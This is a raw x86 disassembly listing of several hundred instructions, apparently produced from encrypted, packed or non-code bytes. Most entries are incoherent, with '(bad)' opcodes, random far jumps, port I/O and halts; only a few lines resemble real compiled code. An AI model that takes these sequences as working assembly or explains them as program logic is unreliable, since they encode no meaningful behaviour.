  40b4a5:	mov    dl,0x6e
  40b4a7:	fnstenv [eax+0x3f56a62b]
  40b4ad:	test   al,0x1f
  40b4af:	xor    ah,bh
  40b4b1:	shl    edx,1
  40b4b3:	mov    bl,0xc9
  40b4b5:	mov    esi,DWORD PTR [ecx]
  40b4b7:	test   DWORD PTR [ebp-0x1b6bf16],0xd718bf79
  40b4c1:	pop    ecx
  40b4c2:	cs cli 
  40b4c4:	add    eax,0x9f18b04
  40b4c9:	addr16 mov esi,0x21e94f63
  40b4cf:	out    dx,al
  40b4d0:	push   ds
  40b4d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4d2:	daa    
  40b4d3:	push   ebx
  40b4d4:	imul   edi,DWORD PTR [edi],0xffffffc8
  40b4d7:	mov    ss:0x6777596e,eax
  40b4dd:	mov    ch,0xd1
  40b4df:	push   ds
  40b4e0:	xchg   esp,edi
  40b4e2:	scas   eax,DWORD PTR es:[edi]
  40b4e3:	dec    edi
  40b4e4:	fnsave ds:0xa2042769
  40b4ea:	sub    ah,bl
  40b4ec:	pop    ebx
  40b4ed:	jbe    0x40b544
  40b4ef:	repnz fistp QWORD PTR [ecx]
  40b4f2:	mov    al,ds:0xe668c414
  40b4f7:	sbb    cl,BYTE PTR [edi+0xd0eaf1d]
  40b4fd:	and    ebx,DWORD PTR [edx-0x2d]
  40b500:	push   esi
  40b501:	arpl   WORD PTR [ebp+0x19443fbb],sp
  40b507:	sbb    al,0x6c
  40b509:	mov    esi,0xa27c8148
  40b50e:	iret   
  40b50f:	push   edx
  40b510:	test   al,0x63
  40b512:	ss addr16 test eax,0xa647730e
  40b519:	adc    edx,eax
  40b51b:	into   
  40b51c:	in     al,0x9c
  40b51e:	pop    eax
  40b51f:	in     al,dx
  40b520:	sbb    eax,0xfc08f615
  40b525:	push   0xffffffe6
  40b527:	jnp    0x40b50a
  40b529:	push   ecx
  40b52a:	hlt    
  40b52b:	lods   al,BYTE PTR ds:[esi]
  40b52c:	bound  ebp,QWORD PTR [ecx+edx*8]
  40b52f:	and    al,0xad
  40b531:	int3   
  40b532:	ror    DWORD PTR [edx-0x1e],cl
  40b535:	pop    ebx
  40b536:	mov    ds:0xb797c6c3,al
  40b53b:	test   DWORD PTR [ecx+0x13],eax
  40b53e:	stc    
  40b53f:	and    DWORD PTR [ebx-0x48],esp
  40b542:	jp     0x40b4e1
  40b544:	retf   0x617b
  40b547:	push   ebp
  40b548:	int    0x81
  40b54a:	mov    bh,0x1b
  40b54c:	adc    edi,DWORD PTR [esi-0x11696afb]
  40b552:	push   0x3a1bdd32
  40b557:	(bad)  
  40b559:	add    esp,DWORD PTR [edx+0xc]
  40b55c:	aaa    
  40b55d:	int    0x1e
  40b55f:	xor    DWORD PTR [edi],esp
  40b561:	sbb    BYTE PTR [esi-0x3e5514a7],ah
  40b567:	cld    
  40b568:	out    dx,al
  40b569:	add    BYTE PTR [esi-0x3d],dh
  40b56c:	mov    al,0xd6
  40b56e:	pop    ds
  40b56f:	push   esp
  40b570:	inc    edx
  40b571:	nop
  40b572:	xchg   esp,eax
  40b573:	push   es
  40b574:	stos   BYTE PTR es:[edi],al
  40b575:	imul   edx,eax,0x817787ba
  40b57b:	fcomp  st(0)
  40b57d:	test   eax,0x4809ce3c
  40b582:	das    
  40b583:	fucomp st(0)
  40b585:	hlt    
  40b586:	scas   al,BYTE PTR es:[edi]
  40b587:	and    eax,0xad761a13
  40b58c:	(bad)  
  40b58d:	ja     0x40b5a2
  40b58f:	sahf   
  40b590:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b591:	cmp    al,0x59
  40b593:	clc    
  40b594:	or     DWORD PTR [ebx-0x55],ecx
  40b597:	inc    ax
  40b599:	loop   0x40b567
  40b59b:	out    dx,al
  40b59c:	jmp    0xc3f0:0xe57f3b64
  40b5a3:	test   ch,0xab
  40b5a6:	add    dl,cl
  40b5a8:	xchg   edx,eax
  40b5a9:	jmp    DWORD PTR [eax]
  40b5ab:	(bad)  
  40b5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5ad:	ja     0x40b558
  40b5af:	or     dl,BYTE PTR [ebp-0x47]
  40b5b2:	add    al,0xf4
  40b5b4:	icebp  
  40b5b5:	pop    ds
  40b5b6:	cmp    eax,0x8512f7e0
  40b5bb:	pop    ds
  40b5bc:	in     eax,dx
  40b5bd:	dec    ebp
  40b5be:	out    dx,eax
  40b5bf:	mov    DWORD PTR [ebp+0x7d],edi
  40b5c2:	or     BYTE PTR [eax-0x7b],0xa1
  40b5c6:	mov    edi,0x7f8ea8d0
  40b5cb:	fsub   DWORD PTR [ecx]
  40b5cd:	or     BYTE PTR [esi],dh
  40b5cf:	dec    edi
  40b5d0:	xchg   ebp,eax
  40b5d1:	pop    esp
  40b5d2:	mov    esi,0x6ec0331f
  40b5d7:	cs pop ss
  40b5d9:	or     bl,ah
  40b5db:	clc    
  40b5dc:	dec    esp
  40b5dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5de:	cmp    BYTE PTR [esp+ebp*8],bl
  40b5e1:	sub    eax,0x17fb8f77
  40b5e7:	or     DWORD PTR [eax-0x441c0af7],edx
  40b5ed:	mov    eax,0xd7e5398f
  40b5f2:	sti    
  40b5f3:	xor    DWORD PTR [ebx+0x28bbf37e],edx
  40b5f9:	popf   
  40b5fa:	dec    esi
  40b5fb:	test   eax,0xa8699fe7
  40b600:	inc    edi
  40b601:	push   eax
  40b602:	je     0x40b5c4
  40b604:	mov    eax,DWORD PTR [ebp-0x10]
  40b607:	mov    DWORD PTR [ebp-0x10],eax
  40b60a:	mov    eax,DWORD PTR [ebp-0x1c]
  40b60d:	jmp    0x40bb18
  40b612:	vpsrld xmm2,xmm7,xmm6
  40b616:	fcmovbe st,st(5)
  40b618:	leave  
  40b619:	sar    DWORD PTR [ebx-0x5],1
  40b61c:	cmp    al,0x28
  40b61e:	(bad)  
  40b61f:	cmp    ah,BYTE PTR [eax]
  40b621:	scas   al,BYTE PTR es:[edi]
  40b622:	mov    eax,0x6a78789b
  40b627:	jl     0x40b6a1
  40b629:	js     0x40b5ce
  40b62b:	aaa    
  40b62c:	scas   al,BYTE PTR es:[edi]
  40b62d:	fst    QWORD PTR [eax]
  40b62f:	jecxz  0x40b677
  40b631:	or     edx,DWORD PTR [edx-0x24b68c63]
  40b637:	mov    al,ds:0xd8d65656
  40b63c:	add    DWORD PTR ss:[ebx+0x56],eax
  40b640:	fistp  QWORD PTR [edi]
  40b642:	ret    
  40b643:	mov    ebp,0x14af8e03
  40b648:	jae    0x40b63b
  40b64a:	(bad)  [ebx-0x31]
  40b64d:	inc    esp
  40b64e:	iret   
  40b64f:	test   ebp,ecx
  40b651:	sbb    al,0x1e
  40b653:	push   ebp
  40b654:	(bad)  
  40b655:	sub    DWORD PTR [ebp-0x54],edx
  40b658:	xchg   esi,eax
  40b659:	mov    bl,0x85
  40b65b:	cmp    eax,0xb45a3dd7
  40b660:	jge    0x40b6ce
  40b662:	add    al,BYTE PTR [eax+ebp*4+0xb]
  40b666:	sub    al,0xb7
  40b668:	inc    esi
  40b669:	lods   eax,DWORD PTR ds:[esi]
  40b66a:	in     al,0x85
  40b66c:	sub    al,bh
  40b66e:	sub    edi,DWORD PTR [esi]
  40b670:	xchg   BYTE PTR [ebx],al
  40b672:	cli    
  40b673:	cmc    
  40b674:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b675:	cmp    BYTE PTR [ecx+0x7d],bh
  40b678:	jo     0x40b6a5
  40b67a:	or     al,ch
  40b67c:	es xor al,0xa2
  40b67f:	shl    BYTE PTR [eax-0xb3e291],0x73
  40b686:	inc    edx
  40b687:	inc    eax
  40b688:	push   ebx
  40b689:	pop    edi
  40b68a:	lea    ecx,gs:0x574133b2
  40b691:	leave  
  40b692:	mov    cl,0xf7
  40b694:	cmp    eax,0x19aa2c1a
  40b699:	(bad)  
  40b69a:	sbb    eax,0xfb941fb6
  40b69f:	repz (bad) 
  40b6a1:	addr16 call 0x7456:0xf8471e23
  40b6a9:	sub    DWORD PTR [esi-0x252fd681],esi
  40b6af:	icebp  
  40b6b0:	fadd   st(1),st
  40b6b2:	dec    ebx
  40b6b3:	scas   eax,DWORD PTR es:[edi]
  40b6b4:	mov    edi,0x849eeb4e
  40b6b9:	call   0xc9135a01
  40b6be:	cdq    
  40b6bf:	aad    0x8b
  40b6c1:	xor    eax,0x64a5e928
  40b6c6:	add    BYTE PTR [eax+esi*2],dh
  40b6c9:	xchg   ebp,eax
  40b6ca:	add    DWORD PTR [edi-0x2d],ebp
  40b6cd:	bound  ebp,QWORD PTR [edx+eiz*2-0x62]
  40b6d1:	push   ecx
  40b6d2:	fsubrp st(0),st
  40b6d4:	addr16 jno 0x40b6b1
  40b6d7:	jno    0x40b69a
  40b6d9:	aaa    
  40b6da:	inc    ebp
  40b6db:	fld    DWORD PTR [ebp-0x50]
  40b6de:	cmp    dh,dl
  40b6e0:	ins    BYTE PTR es:[edi],dx
  40b6e1:	jmp    0x40b6fc
  40b6e3:	jp     0x40b6f6
  40b6e5:	in     al,0x7a
  40b6e7:	inc    eax
  40b6e8:	in     al,0x42
  40b6ea:	fisub  WORD PTR [edi-0x17]
  40b6ed:	sbb    ebx,DWORD PTR [ecx-0x21]
  40b6f0:	(bad)  
  40b6f1:	ins    DWORD PTR es:[edi],dx
  40b6f2:	adc    eax,eax
  40b6f4:	jae    0x40b6d3
  40b6f6:	loope  0x40b6ed
  40b6f8:	sar    DWORD PTR ss:0x5e7999bf,cl
  40b6ff:	icebp  
  40b700:	sub    eax,0xe4e051c7
  40b705:	add    ah,BYTE PTR [ebp+0x2520a5c0]
  40b70b:	mov    ebx,0x96854b84
  40b710:	cld    
  40b711:	adc    al,0xd0
  40b713:	test   DWORD PTR [bx-0x4e],ebx
  40b717:	xchg   esp,eax
  40b718:	test   eax,0x9648fa82
  40b71d:	neg    BYTE PTR ds:0x35a6b52
  40b723:	pop    ecx
  40b724:	fadd   DWORD PTR [ecx+0x56]
  40b727:	bound  eax,QWORD PTR [ecx+edi*4-0x1fb8be06]
  40b72e:	(bad)  
  40b72f:	push   eax
  40b730:	push   es
  40b731:	sub    eax,0xce68fd51
  40b736:	lar    esi,WORD PTR [esi-0x2a]
  40b73a:	mov    bl,0xb9
  40b73c:	xor    edx,DWORD PTR es:[eax+esi*8+0x7d87b7fc]
  40b744:	lds    esi,FWORD PTR [esi-0x55]
  40b747:	mul    dl
  40b749:	inc    ebx
  40b74a:	(bad)  [edx+0x3e]
  40b74d:	push   ecx
  40b74e:	adc    eax,0x2a47dcd2
  40b753:	ja     0x40b79b
  40b755:	and    eax,0x8ec544dc
  40b75a:	(bad)  
  40b75b:	loope  0x40b6ef
  40b75d:	fwait
  40b75e:	mov    al,ds:0xbf133853
  40b763:	fsubr  DWORD PTR [ecx]
  40b765:	push   0x70ae7259
  40b76a:	stos   DWORD PTR es:[edi],eax
  40b76b:	mov    esi,DWORD PTR [esi-0x3ae870cc]
  40b771:	mov    dl,0x3c
  40b773:	mov    esp,0xb9afdf69
  40b778:	mov    esp,0x42e5cef4
  40b77d:	in     eax,0x28
  40b77f:	and    eax,DWORD PTR [esi+0xa]
  40b782:	jl     0x40b745
  40b784:	iret   
  40b785:	inc    esp
  40b786:	addr16 in al,dx
  40b788:	pop    ebp
  40b789:	ins    DWORD PTR es:[edi],dx
  40b78a:	and    al,0xf5
  40b78c:	daa    
  40b78d:	fwait
  40b78e:	imul   edi,DWORD PTR [edx+0x24],0x896434bc
  40b795:	les    eax,FWORD PTR [edx-0x58]
  40b798:	sub    al,0xef
  40b79a:	mov    ch,0xd2
  40b79c:	aaa    
  40b79d:	pop    ebx
  40b79e:	sbb    eax,0xa67ceab7
  40b7a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7a4:	jns    0x40b7e5
  40b7a6:	sbb    bh,bl
  40b7a8:	sbb    bh,0xc3
  40b7ab:	pop    ebx
  40b7ac:	out    dx,eax
  40b7ad:	push   esp
  40b7ae:	int3   
  40b7af:	les    edx,FWORD PTR [edi]
  40b7b1:	jle    0x40b830
  40b7b3:	mov    ds:0xd6b90e65,eax
  40b7b8:	cmp    ebx,eax
  40b7ba:	pusha  
  40b7bb:	sbb    al,0x73
  40b7bd:	jae    0x40b777
  40b7bf:	jmp    0x1b0a5cb
  40b7c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7c5:	in     al,dx
  40b7c6:	or     bl,BYTE PTR [edi+edx*8+0x3e]
  40b7ca:	call   0xfe67:0xe119961c
  40b7d1:	cwde   
  40b7d2:	fs ret 
  40b7d4:	jl     0x40b7c3
  40b7d6:	sar    DWORD PTR [ebx-0x5013a24b],1
  40b7dc:	jne    0x40b798
  40b7de:	fild   WORD PTR ds:0x1703b70b
  40b7e4:	and    ah,BYTE PTR [edi]
  40b7e6:	push   edi
  40b7e7:	xchg   ecx,eax
  40b7e8:	bound  edi,QWORD PTR [ebx+0x43]
  40b7eb:	mov    WORD PTR gs:[ebx],?
  40b7ee:	shl    edi,0xf8
  40b7f1:	ds cs and al,0xc3
  40b7f5:	f2xm1  
  40b7f7:	add    eax,0xab4b0be9
  40b7fc:	loop   0x40b85c
  40b7fe:	das    
  40b7ff:	jo     0x40b7cd
  40b801:	jmp    0x6f48bc0
  40b806:	jno    0x40b81f
  40b808:	adc    DWORD PTR [ecx],ebx
  40b80a:	xchg   esi,eax
  40b80b:	mov    ds:0x85b10eb7,al
  40b810:	fist   DWORD PTR [ecx-0xdb98ad]
  40b816:	jb     0x40b86b
  40b818:	jle    0x40b83e
  40b81a:	ja     0x40b83f
  40b81c:	dec    edx
  40b81d:	adc    BYTE PTR [eax-0x62],0xf4
  40b821:	pop    ebp
  40b822:	sub    al,BYTE PTR [eax]
  40b824:	fadd   DWORD PTR [edx-0x793effdf]
  40b82a:	sub    eax,DWORD PTR [edi]
  40b82c:	cs jecxz 0x40b87d
  40b82f:	mov    fs,esi
  40b831:	inc    eax
  40b832:	xchg   edx,eax
  40b833:	xor    BYTE PTR ds:0xabf81a00,cl
  40b839:	ja     0x40b89e
  40b83b:	mov    dl,0x4d
  40b83d:	retf   0xf274
  40b840:	push   ss
  40b841:	or     eax,0x99a348dd
  40b846:	out    dx,eax
  40b847:	and    ebx,DWORD PTR [edi-0x4ec93ae4]
  40b84d:	fsubr  DWORD PTR [edx]
  40b84f:	pushf  
  40b850:	jbe    0x40b82f
  40b852:	cmp    eax,0x3014990d
  40b857:	add    DWORD PTR [edx-0x4e],0xffffffa4
  40b85b:	arpl   WORD PTR [esi+ebx*8],cx
  40b85e:	cmc    
  40b85f:	jns    0x40b84b
  40b861:	adc    BYTE PTR [ebx+0x20],0x89
  40b865:	mov    ch,0x41
  40b867:	outs   dx,DWORD PTR ds:[esi]
  40b868:	nop
  40b869:	add    DWORD PTR [esi-0x280d72ab],esi
  40b86f:	jl     0x40b895
  40b871:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b873:	jae    0x40b872
  40b875:	adc    al,0xc0
  40b877:	not    BYTE PTR [eax-0x74]
  40b87a:	inc    esi
  40b87b:	xchg   DWORD PTR [ebp+0x2e],ebx
  40b87e:	mov    ebx,0x4465c981
  40b883:	lods   al,BYTE PTR ds:[esi]
  40b884:	in     al,dx
  40b885:	inc    esp
  40b886:	scas   eax,DWORD PTR es:[edi]
  40b887:	push   esp
  40b888:	fnstcw WORD PTR [edi+0x7942ba5c]
  40b88e:	pop    esi
  40b88f:	cmp    edi,DWORD PTR [ecx]
  40b891:	loope  0x40b8d3
  40b893:	push   edi
  40b894:	and    ebp,DWORD PTR [esi+0x7fce6dea]
  40b89a:	cld    
  40b89b:	mov    ds:0x65a4238c,al
  40b8a0:	dec    ecx
  40b8a1:	cs mov edx,0x5a531115
  40b8a7:	shr    BYTE PTR [eax],cl
  40b8a9:	push   ds
  40b8aa:	test   eax,0x7baf6b71
  40b8af:	sahf   
  40b8b0:	jecxz  0x40b8fd
  40b8b2:	test   eax,0xf21e690b
  40b8b7:	in     al,dx
  40b8b8:	pop    ss
  40b8b9:	outs   dx,BYTE PTR ds:[esi]
  40b8ba:	adc    DWORD PTR [edx-0x49a3abe7],0xffffff83
  40b8c1:	(bad)  
  40b8c3:	stos   BYTE PTR es:[edi],al
  40b8c4:	gs loop 0x40b90d
  40b8c7:	fcom   st(2)
  40b8c9:	(bad)  
  40b8ca:	and    dl,BYTE PTR ss:[ebx-0x4b]
  40b8ce:	(bad)  
  40b8cf:	mov    cl,dh
  40b8d1:	(bad)  
  40b8d2:	cmp    cl,BYTE PTR [ebp-0x34da0754]
  40b8d8:	(bad)  [ecx-0x4bb2fe62]
  40b8de:	and    ah,ah
  40b8e0:	loop   0x40b8e8
  40b8e2:	loop   0x40b86f
  40b8e4:	jbe    0x40b8a3
  40b8e6:	xchg   esp,eax
  40b8e7:	push   0xa
  40b8e9:	inc    edx
  40b8ea:	sbb    BYTE PTR [ecx],0x59
  40b8ed:	xor    BYTE PTR [ebx+0x7589b52b],al
  40b8f3:	xchg   ebp,eax
  40b8f4:	in     al,dx
  40b8f5:	lods   eax,DWORD PTR ds:[esi]
  40b8f6:	xchg   ecx,eax
  40b8f7:	xchg   ebx,eax
  40b8f8:	push   ecx
  40b8f9:	hlt    
  40b8fa:	mov    dl,0xe7
  40b8fc:	xlat   BYTE PTR ds:[ebx]
  40b8fd:	ins    DWORD PTR es:[edi],dx
  40b8fe:	dec    esp
  40b8ff:	fwait
  40b900:	arpl   dx,cx
  40b902:	push   0xffffff94
  40b904:	mov    bl,0x28
  40b906:	inc    ebx
  40b907:	je     0x40b909
  40b909:	inc    edi
  40b90a:	test   DWORD PTR [esi-0x21],ecx
  40b90d:	(bad)  
  40b90e:	jmp    0x1354:0xdf81560d
  40b915:	sub    bh,BYTE PTR [ecx]
  40b917:	div    esi
  40b919:	jp     0x40b902
  40b91b:	daa    
  40b91c:	xor    DWORD PTR [edx],esi
  40b91e:	inc    ecx
  40b91f:	ja     0x40b97c
  40b921:	ficomp DWORD PTR [ecx+0x2b]
  40b924:	mov    gs,WORD PTR [edx-0x6a814166]
  40b92a:	ret    0x6b0b
  40b92d:	pop    ebp
  40b92e:	xchg   esi,eax
  40b92f:	outs   dx,DWORD PTR ds:[esi]
  40b930:	icebp  
  40b931:	test   al,0xd1
  40b933:	xchg   ebx,eax
  40b934:	push   0xffffff9f
  40b936:	cmp    eax,0x166508da
  40b93b:	and    al,0x83
  40b93d:	sbb    ebx,ebp
  40b93f:	fbstp  TBYTE PTR [edi]
  40b941:	int3   
  40b942:	sub    eax,edi
  40b944:	mov    ch,0x9
  40b946:	xor    BYTE PTR [eax+0x33a0427f],dl
  40b94c:	shl    bl,cl
  40b94e:	daa    
  40b94f:	mov    esi,0xe769f57a
  40b954:	xchg   edi,eax
  40b955:	ss and eax,0x6fbc1389
  40b95b:	sub    DWORD PTR [eax+0x7813160b],0x42c3510
  40b965:	shr    BYTE PTR gs:[ecx],0x7b
  40b969:	push   esi
  40b96a:	dec    eax
  40b96b:	bound  ebp,QWORD PTR [ebx-0x6e]
  40b96e:	and    eax,0x16751b3c
  40b973:	mov    eax,ss
  40b975:	push   es
  40b976:	and    dl,BYTE PTR [edi+eax*8+0x2cba0926]
  40b97d:	xchg   esi,eax
  40b97e:	sub    bl,bh
  40b980:	push   eax
  40b981:	mov    eax,0x548f8fab
  40b986:	mov    bl,0x39
  40b988:	add    eax,0xc4410823
  40b98d:	sar    DWORD PTR [edi-0x95d0a9c],cl
  40b993:	add    DWORD PTR [ecx-0x8],edi
  40b996:	cs popf 
  40b998:	cmp    BYTE PTR [ebp+0x1c],ah
  40b99b:	push   eax
  40b99c:	imul   ebx,eax,0x46
  40b99f:	xchg   esi,eax
  40b9a0:	jae    0x40b9ee
  40b9a2:	mov    edx,0x9d0a3007
  40b9a7:	adc    BYTE PTR [ebx+0x5],ah
  40b9aa:	add    ecx,DWORD PTR ds:0x917f9bf4
  40b9b0:	cmp    esi,ebx
  40b9b2:	(bad)  [edx]
  40b9b4:	pop    eax
  40b9b5:	pop    esp
  40b9b6:	jg     0x40b9a5
  40b9b8:	ss lock adc eax,0x29fad5cf
  40b9bf:	aam    0xde
  40b9c1:	xchg   ecx,eax
  40b9c2:	mov    dl,BYTE PTR [ebx]
  40b9c4:	lock or edi,edi
  40b9c7:	mov    bh,0x3a
  40b9c9:	es retf 0x6d5d
  40b9cd:	cli    
  40b9ce:	jg     0x40b9e7
  40b9d0:	fcmovu st,st(0)
  40b9d2:	mov    ss,esi
  40b9d4:	test   eax,eax
  40b9d6:	repz dec edi
  40b9d8:	jae    0x40b996
  40b9da:	fadd   DWORD PTR [ecx-0x37]
  40b9dd:	outs   dx,DWORD PTR ds:[esi]
  40b9de:	(bad)  
  40b9df:	sbb    bh,BYTE PTR [ecx-0x4ab0df6]
  40b9e5:	cli    
  40b9e6:	sbb    BYTE PTR [eax+eax*2],bl
  40b9e9:	or     eax,0x5a76f9d2
  40b9ee:	test   esi,ecx
  40b9f0:	rcl    BYTE PTR [esi],cl
  40b9f2:	jle    0x40b9a5
  40b9f4:	inc    DWORD PTR [eax-0x12]
  40b9f7:	adc    ah,bh
  40b9f9:	xchg   ecx,eax
  40b9fa:	push   ss
  40b9fb:	mov    ebp,0x1737f400
  40ba00:	xor    al,0xd
  40ba02:	pop    eax
  40ba03:	aad    0x8e
  40ba05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba06:	into   
  40ba07:	ud1    ebp,ecx
  40ba0a:	popa   
  40ba0b:	or     BYTE PTR [eax],al
  40ba0d:	data16 mov dh,0x41
  40ba10:	push   0xffffffb4
  40ba12:	inc    edx
  40ba13:	dec    eax
  40ba14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba15:	xor    edx,DWORD PTR [edx+0x6f]
  40ba18:	fisub  WORD PTR [ecx-0x29999532]
  40ba1e:	(bad)  
  40ba20:	jnp    0x40b9df
  40ba22:	or     BYTE PTR [ebx-0x220ad557],cl
  40ba28:	les    eax,FWORD PTR [edi-0x7f]
  40ba2b:	pop    esp
  40ba2c:	out    0x29,eax
  40ba2e:	lahf   
  40ba2f:	mov    ebp,0xb348fa8a
  40ba34:	cli    
  40ba35:	cdq    
  40ba36:	or     DWORD PTR [eax+0x3a],edx
  40ba39:	push   es
  40ba3a:	add    eax,0x9d8a107c
  40ba3f:	(bad)  
  40ba40:	std    
  40ba41:	imul   esp,DWORD PTR [edx+0x1c],0x75
  40ba45:	add    bh,bl
  40ba47:	ficomp WORD PTR [edx]
  40ba49:	je     0x40ba63
  40ba4b:	iret   
  40ba4c:	mov    dl,0x3f
  40ba4e:	cld    
  40ba4f:	mov    esi,0xaa1199b0
  40ba54:	shr    DWORD PTR [ebp-0x2c254a96],cl
  40ba5a:	jb     0x40ba87
  40ba5c:	push   esp
  40ba5d:	bound  edi,QWORD PTR [ecx]
  40ba5f:	imul   esi,DWORD PTR [edx+eax*4],0x710eff6e
  40ba66:	mov    ds:0x8eb487c0,al
  40ba6b:	clc    
  40ba6c:	adc    eax,0x6acbf4d3
  40ba71:	dec    esi
  40ba72:	test   al,0x53
  40ba74:	lahf   
  40ba75:	mov    al,0x7d
  40ba77:	inc    edx
  40ba78:	stos   DWORD PTR es:[edi],eax
  40ba79:	sub    ecx,DWORD PTR [eax+0x52]
  40ba7c:	pop    edi
  40ba7d:	xchg   esp,eax
  40ba7e:	mov    bh,0x22
  40ba80:	imul   esp,DWORD PTR [eax-0x2e],0xaf425705
  40ba87:	(bad)  
  40ba88:	std    
  40ba89:	xchg   ebx,eax
  40ba8a:	sbb    al,0xe0
  40ba8c:	fdivr  QWORD PTR [edx+0x57f89196]
  40ba92:	dec    esp
  40ba93:	(bad)  
  40ba94:	aam    0x1e
  40ba96:	jmp    0x40badf
  40ba98:	xchg   ebp,eax
  40ba99:	leave  
  40ba9a:	das    
  40ba9b:	test   al,0xd
  40ba9d:	(bad)  [esi+eax*1+0x2ba0fa36]
  40baa4:	into   
  40baa5:	xchg   ecx,eax
  40baa6:	shr    BYTE PTR [eax],1
  40baa8:	in     al,dx
  40baa9:	push   ebp
  40baaa:	into   
  40baab:	mov    edx,0x9a03952d
  40bab0:	lea    ebx,[ebx]
  40bab2:	ja     0x40bae0
  40bab4:	xor    DWORD PTR ds:0x6a782e6,0xcdedb861
  40babe:	fnsave [edx-0x12]
  40bac1:	xchg   ebx,eax
  40bac2:	cmp    ecx,DWORD PTR [esi]
  40bac4:	fadd   st(4),st
  40bac6:	or     bl,ah
  40bac8:	stos   BYTE PTR es:[edi],al
  40bac9:	pop    ebp
  40baca:	mov    ebx,0xc287e4a0
  40bacf:	push   esi
  40bad0:	mov    ecx,0x15531242
  40bad5:	xchg   ebx,eax
  40bad6:	xorps  xmm2,XMMWORD PTR [edx+0x75]
  40bada:	pop    ds
  40badb:	(bad)  
  40badc:	jbe    0x40bb00
  40bade:	pop    ebp
  40badf:	mov    dh,0x9a
  40bae1:	or     al,0xcc
  40bae3:	jns    0x40bad8
  40bae5:	call   0xfad7:0xf66928bc
  40baec:	sar    DWORD PTR ss:[edi+edi*1-0x6820cdc2],0x7a
  40baf5:	mov    ds:0x177044ec,eax
  40bafb:	jmp    0xe913:0x2f029260
  40bb02:	add    ch,BYTE PTR [edi-0x34]
  40bb05:	test   eax,0x222c398b
  40bb0a:	mov    al,ds:0xf8a69119
  40bb0f:	in     al,dx
  40bb10:	lea    ebp,[ebx-0x48]
  40bb13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb14:	fdivr  QWORD PTR [ecx-0x56]
  40bb17:	mov    bl,0x89
  40bb19:	pop    ebp
  40bb1a:	ror    BYTE PTR [ecx+0x458bd445],0xc0
  40bb21:	jmp    0x40c02c
  40bb26:	ror    esp,1
  40bb28:	ror    ah,cl
  40bb2a:	rcl    edx,1
  40bb2c:	rcl    ecx,1
  40bb2e:	cld    
  40bb2f:	in     al,dx
  40bb30:	lock cmp eax,0x7216f2d5
  40bb36:	stos   BYTE PTR es:[edi],al
  40bb37:	sahf   
  40bb38:	js     0x40bbb2
  40bb3a:	push   0x7c
  40bb3c:	js     0x40bbb6
  40bb3e:	in     al,0x4b
  40bb40:	push   cs
  40bb41:	popf   
  40bb42:	int    0xce
  40bb44:	add    DWORD PTR [ebp+0x11],esi
  40bb47:	adc    al,0x67
  40bb49:	and    esp,edx
  40bb4b:	inc    ebp
  40bb4c:	pop    ds
  40bb4d:	fld    DWORD PTR [ecx+ebx*1]
  40bb50:	cmp    bl,BYTE PTR [edi-0x36]
  40bb53:	fcmovb st,st(0)
  40bb55:	sbb    eax,0x1d3196e6
  40bb5a:	jae    0x40bb4b
  40bb5c:	fistp  DWORD PTR [edx-0x3a]
  40bb5f:	cmp    BYTE PTR [eax+esi*4-0x5f],bh
  40bb63:	adc    eax,0xaff2d772
  40bb68:	pop    eax
  40bb69:	push   0xffffff92
  40bb6b:	sbb    al,0xee
  40bb6d:	jecxz  0x40bb5f
  40bb6f:	cmp    BYTE PTR [edi+0x55],cl
  40bb72:	pop    ebx
  40bb73:	mov    dh,0xaa
  40bb75:	hlt    
  40bb76:	add    bh,dl
  40bb78:	adc    ah,ah
  40bb7a:	ficomp WORD PTR [eax+0x2c2155f2]
  40bb80:	jl     0x40bbd1
  40bb82:	xor    al,0x3d
  40bb84:	and    esp,esp
  40bb86:	in     eax,0xb0
  40bb88:	outs   dx,DWORD PTR ds:[esi]
  40bb89:	dec    edx
  40bb8a:	idiv   BYTE PTR [ecx]
  40bb8c:	jbe    0x40bbd7
  40bb8e:	arpl   WORD PTR [edx],cx
  40bb90:	adc    al,0xb8
  40bb92:	mov    cl,0xea
  40bb94:	mov    eax,0xf2ec74a8
  40bb99:	(bad)  [ebx+0x1dd7626a]
  40bb9f:	adc    ebp,ecx
  40bba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bba2:	jmp    0x3740756f
  40bba7:	push   cs
  40bba8:	aas    
  40bba9:	nop
  40bbaa:	and    DWORD PTR [edx],edx
  40bbac:	dec    edx
  40bbad:	xlat   BYTE PTR ds:[ebx]
  40bbae:	out    dx,eax
  40bbaf:	int    0x81
  40bbb1:	loopne 0x40bc29
  40bbb3:	adc    al,0x72
  40bbb5:	js     0x40bc1f
  40bbb7:	inc    edx
  40bbb8:	stos   DWORD PTR es:[edi],eax
  40bbb9:	retf   0x619f
  40bbbc:	mov    dh,0x27
  40bbbe:	sbb    BYTE PTR [edi-0x16],dh
  40bbc1:	xchg   dh,dl
  40bbc3:	fmul   DWORD PTR [bx+di]
  40bbc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbc7:	jno    0x40bbff
  40bbc9:	adc    edi,DWORD PTR [esi]
  40bbcb:	cmp    al,0xcf
  40bbcd:	retf   0xb6ab
  40bbd0:	ror    cl,1
  40bbd2:	loop   0x40bb8e
  40bbd4:	outs   dx,DWORD PTR ds:[esi]
  40bbd5:	ins    DWORD PTR es:[edi],dx
  40bbd6:	xor    eax,0x3ec05f5e
  40bbdb:	jge    0x40bbb2
  40bbdd:	xor    bh,ch
  40bbdf:	adc    eax,0x2f43d307
  40bbe4:	rcr    ah,cl
  40bbe6:	scas   al,BYTE PTR es:[edi]
  40bbe7:	and    BYTE PTR [ebp-0xa29735e],bl
  40bbed:	jge    0x40bb8c
  40bbef:	mov    eax,ds:0x4d7c77db
  40bbf4:	mov    db1,eax
  40bbf7:	mov    dl,0xa3
  40bbf9:	loopne 0x40bbd3
  40bbfb:	or     dh,BYTE PTR [ebx-0x8]
  40bbfe:	xchg   ecx,eax
